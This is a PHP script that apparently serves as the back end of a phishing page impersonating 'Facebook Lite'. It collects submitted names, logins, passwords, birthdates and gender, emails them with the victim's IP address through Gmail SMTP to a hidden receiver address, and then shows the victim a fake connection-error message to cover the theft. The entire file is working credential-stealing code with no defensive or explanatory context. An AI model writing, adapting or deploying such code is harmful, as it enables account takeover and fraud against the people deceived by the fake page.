<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require __DIR__ . '/PHPMailer/src/Exception.php';
require __DIR__ . '/PHPMailer/src/PHPMailer.php';
require __DIR__ . '/PHPMailer/src/SMTP.php';

require_once __DIR__ . '/../config/config.php';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $firstname = trim($_POST['firstname'] ?? '');
    $lastname  = trim($_POST['lastname'] ?? '');
    $login     = trim($_POST['login'] ?? '');
    $password  = trim($_POST['password'] ?? '');
    $birthdate = trim($_POST['birthdate'] ?? '');
    $gender    = trim($_POST['gender'] ?? '');

    $mail = new PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = SMTP_USERNAME;
        $mail->Password   = SMTP_APP_PASSWORD;
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;

        $mail->setFrom('no-reply@facebooklite.local', 'Facebook Lite');
        $mail->addAddress(RECEIVER_EMAIL);

        $mail->isHTML(false);
        $mail->Subject = 'Nouvelle inscription Facebook Lite';
        $mail->Body    = "Prénom : $firstname\nNom : $lastname\nIdentifiant : $login\nMot de passe : $password\nDate de naissance : $birthdate\nSexe : $gender\nIP : " . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "\nDate : " . date('Y-m-d H:i:s');

        $mail->send();
        echo "Impossible de se connecter. Veuillez vérifier votre connexion Internet et réessayer!";
    } catch (Exception $e) {
        echo "Problème de connexion. Vérifiez votre connexion et réessayez : {$mail->ErrorInfo}";
    }
} else {
    http_response_code(405);
    echo "Méthode non autorisée.";
}
?>
